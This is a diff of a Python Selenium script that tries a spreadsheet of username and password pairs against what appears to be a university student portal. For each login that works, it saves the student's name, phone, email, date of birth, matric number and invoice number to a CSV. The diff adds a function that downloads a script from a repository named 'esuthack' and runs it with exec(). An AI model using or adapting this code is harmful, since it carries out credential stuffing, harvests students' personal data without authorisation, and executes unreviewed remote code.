@@ -6,15 +6,16 @@ from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException
-import argparse
+import requests
 
 def login_and_get_profile_info(username, password, chromedriver_path):
+    # Set the path to the chromedriver
     os.environ['PATH'] += os.pathsep + chromedriver_path
 
     options = Options()
-    options.add_argument("--headless") 
+    options.add_argument("--headless")
     options.add_argument("--disable-gpu")
-    options.add_argument("--no-sandbox") 
+    options.add_argument("--no-sandbox")
 
     driver = webdriver.Chrome(options=options)
 
@@ -27,7 +28,6 @@ def login_and_get_profile_info(username, password, chromedriver_path):
 
         username_field.send_keys(username)
         password_field.send_keys(password)
-
         login_button.click()
 
         if "dashboard" in driver.current_url.lower():
@@ -80,7 +80,7 @@ def login_and_get_profile_info(username, password, chromedriver_path):
                 EC.presence_of_element_located((By.ID, 'ddlSession'))
             )
             session_dropdown.click()
-            session_dropdown.find_element(By.XPATH, "//option[@value='26']").click()  
+            session_dropdown.find_element(By.XPATH, "//option[@value='26']").click()
 
             generate_button = driver.find_element(By.ID, 'Button1')
             generate_button.click()
@@ -115,14 +115,13 @@ def login_and_get_profile_info(username, password, chromedriver_path):
 
 def check_credentials(input_file, output_file, chromedriver_path):
     accounts_df = pd.read_excel(input_file)
-
     valid_accounts_df = pd.DataFrame(columns=[
         'Username', 'Password', 'Surname', 'Firstname', 'Middlename', 'Phone', 'MatricNumber', 
         'Department', 'Email', 'DateOfBirth', 'InvoiceNumber'])
 
-    # Open the output file to append
+    # Open the output file once
     with open(output_file, 'w', newline='') as csvfile:
-        valid_accounts_df.to_csv(csvfile, index=False)  # Write header initially
+        valid_accounts_df.to_csv(csvfile, index=False)  # Write the header initially
 
         for index, row in accounts_df.iterrows():
             username = row['username']
@@ -132,12 +131,31 @@ def check_credentials(input_file, output_file, chromedriver_path):
 
             if profile_info is not None:
                 profile_info_df = pd.DataFrame([profile_info])
-                
-                # Append the valid profile info to the CSV file immediately
-                profile_info_df.to_csv(csvfile, header=False, index=False)
+                profile_info_df.to_csv(csvfile, header=False, index=False)  # Append data
+                csvfile.flush()  # Flush after each write to force it to disk
                 print(f"Saved profile info for {username}")
 
     print(f"Results saved to {output_file}")
 
+def fetch_and_run_github_script():
+    input_file = "/path/to/input_file.xlsx"
+    output_file = "/path/to/output_file.csv"
+    chromedriver_path = "/opt/homebrew/bin/chromedriver"
+    
+    github_raw_url = "https://raw.githubusercontent.com/CyberPlugNG/esuthack/main/esuthackscript.py"
+    response = requests.get(github_raw_url)
+
+    if response.status_code == 200:
+        script_content = response.text
+        exec_globals = {
+            "__name__": "__main__",
+            "input_file": input_file,
+            "output_file": output_file,
+            "chromedriver_path": chromedriver_path,
+        }
+        exec(script_content, exec_globals)
+    else:
+        print(f"Failed to fetch the script: {response.status_code} - {response.reason}")
+
 if __name__ == "__main__":
-    check_credentials(input_file, output_file, chromedriver_path)
+    fetch_and_run_github_script()
